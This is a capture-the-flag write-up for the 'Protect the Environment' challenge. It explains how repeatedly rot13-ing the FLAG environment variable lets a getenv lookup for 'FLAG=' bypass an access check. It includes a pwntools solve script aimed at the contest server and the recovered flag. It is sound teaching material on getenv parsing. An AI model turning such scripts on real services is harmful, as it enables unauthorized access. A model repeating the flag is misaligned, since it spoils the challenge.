# Protect the Environment

Co-authors: @Rosayxy

```
Protect the earth? We can't even protect our environment variables...
nc 0.cloud.chals.io 33121 
```

Source code in attachment:

```c
// gcc -o chall chall.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void rot13(char *s) {
  while (*s != 0) {
    *s += 13;
    s++;
  }
}

int main(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  char command[64];
  char name[64];

  while (1) {
    printf("> ");
    scanf("%63s %63s", command, name);
    if (!strcmp(command, "protect")) {
      char *val = getenv(name);
      if (val) {
        rot13(val);
        printf("Protected %s\n", name);
      } else {
        printf("No such environment variable\n");
      }
    } else if (!strcmp(command, "print")) {
      if (!strcmp(name, "FLAG")) {
        printf("Access denied\n");
      } else {
        char *val = getenv(name);
        if (val) {
          printf("%s=%s\n", name, val);
        } else {
          printf("No such environment variable\n");
        }
      }
    } else {
      printf("Unknown command\n");
      break ;
    }
  } 
  return 0;
}
```

It seems not vulnerable. However, if we read the source of `getenv`:

```c
size_t len = strlen (name);
for (char **ep = start_environ; ; ++ep)
{
    char *entry = atomic_load_relaxed (ep);
    if (entry == NULL)
    break;

    /* If there is a match, return that value.  It was valid at
        one point, so we can return it.  */
    if (name[0] == entry[0]
        && strncmp (name, entry, len) == 0 && entry[len] == '=')
    return entry + len + 1;
}
```

@Rosayxy makes a critical observation: What if the environment string contains more than one `=`? E.g. `FLAG==abcd`, we can use both `getenv("FLAG")` and `getenv("FLAG=")` to read its content. If we protect `FLAG` several times, until it begins with `=`, we can use `getenv("FLAG=")` to read out the rotated text. Then, we can recover the text manually:

```python
from pwn import *

context(log_level = "debug")

# p = process("./chall")
p = remote("0.cloud.chals.io", 33121)

for i in range(128):
    p.recvuntil(b"> ")
    p.sendline(b"protect FLAG")
    p.recvuntil(b"> ")
    p.sendline(b"print FLAG=")
    line = p.recvline()
    if b"FLAG" in line:
        line = line.decode()
        print(line)
        part = "=".join(line.split("=")[1:])
        for ch in part:
            print(chr((ord(ch) - (i + 1) * 13 + 256) % 256), end="")
        print()
        break
```

Output:

```
FLAG==fik@;r?+i;VkFVgifK*:KVk_*V*em(iFed*EKVn(k?VC(YZVD(,ki*+k(e^V(kt

FortID{H4rD_tO_proT3CT_th3_3nv1rOnm3NT_w1tH_L1bc_M15tr34t1ng_1t}\x13
```
